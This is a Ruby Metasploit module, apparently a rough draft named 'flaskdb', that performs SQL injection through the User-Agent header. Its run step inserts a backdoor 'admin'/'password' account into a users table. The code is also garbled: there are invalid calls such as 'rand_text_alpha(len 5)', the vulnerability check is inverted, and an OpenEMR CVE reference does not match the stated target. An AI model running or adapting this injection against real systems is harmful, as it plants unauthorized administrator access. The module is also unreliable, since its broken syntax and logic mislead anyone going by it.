require 'csv'

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::SQLi

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'flaskdb',
      'Description' => '
        hellooo
      ',
      'License' => MSF_LICENSE,
      'Author' =>
        [
          'smoke'
        ],
      'References' => [
        ['CVE', '2018-17179'],
        ['URL', 'https://github.com/openemr/openemr/commit/3e22d11c7175c1ebbf3d862545ce6fee18f70617']
      ],
      'DisclosureDate' => '2019-05-17'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to the rb', '/'])
      ]
    )
  end


  def sqli(query)
    rand = Rex::Text.rand_text_alpha(len 5)
    query = "#{rand}';#{query};--"
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/'),
      'headers' => {
          'user-agent' => "#{query}'"
        
        }
    })
    return res

  end
  
  def check
    res = sqli(query "'")

    if res && res.code == 200

      Exploit::CheckCode::Safe
    
    else 

      Exploit::CheckCode::Vulnerable
    end
    
    


    
  end


  def run
    unless check == CheckCode::Vulnerable
      fail_with Failure::NotVulnerable, 'Target is not vulnerable'
    end


    add_user = "INSERT INTO users(username, password) VALUES('admin', 'password')"
    res = sqli(add_user)
  
  end
end
